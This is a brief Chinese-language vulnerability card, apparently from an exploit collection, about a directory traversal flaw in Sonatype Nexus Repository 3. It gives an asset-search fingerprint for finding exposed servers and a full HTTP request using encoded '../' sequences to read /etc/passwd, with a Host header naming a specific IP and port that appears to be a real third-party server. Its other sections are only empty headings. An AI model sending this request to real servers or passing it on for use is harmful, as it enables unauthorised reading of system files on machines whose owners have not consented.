# SonatypeNexusRepository3存在目录遍历漏洞

- **系统**：SonatypeNexusRepository3　|　**类型**：路径遍历　|　**CVE**：—
- **指纹**：`app="Nexus-Repository-Manager"`
- **请求**：`GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1`
- **关键头**：`Host: 162.19.64.171:8081`

**请求体 / payload**
```

```

**其他**
- Sonatype Nexus Repository 3存在目录遍历漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Sonatype Nexus Repository